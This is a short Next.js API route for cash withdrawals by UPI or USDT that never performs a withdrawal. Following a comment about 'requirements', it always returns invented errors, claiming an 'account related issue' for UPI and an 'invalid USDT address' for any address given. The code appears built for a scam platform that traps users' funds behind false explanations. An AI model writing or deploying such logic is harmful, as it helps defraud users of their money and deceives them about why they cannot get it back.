import { NextRequest, NextResponse } from 'next/server';
import { getSession } from '@/lib/auth';

import { v4 as uuidv4 } from 'uuid';
import { z } from 'zod';

export const runtime = 'nodejs';

const withdrawSchema = z.object({
  method: z.enum(['upi', 'usdt']),
  upiId: z.string().optional(),
  usdtAddress: z.string().optional(),
});

export async function POST(request: NextRequest) {
  const session = await getSession();

  if (!session) {
    return NextResponse.json(
      { error: 'Unauthorized' },
      { status: 401 }
    );
  }

  try {
    const body = await request.json();
    const { method, upiId, usdtAddress } = withdrawSchema.parse(body);

    // Always return error messages as per requirements
    if (method === 'upi') {
      return NextResponse.json(
        {
          error: 'Account related issue found. Please contact administration for further assistance.',
          success: false
        },
        { status: 400 }
      );
    }

    if (method === 'usdt') {
      return NextResponse.json(
        {
          error: 'Invalid USDT address.',
          success: false
        },
        { status: 400 }
      );
    }

    return NextResponse.json(
      { error: 'Invalid withdrawal method' },
      { status: 400 }
    );
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        { error: 'Invalid input', details: error.errors },
        { status: 400 }
      );
    }

    console.error('Withdraw error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

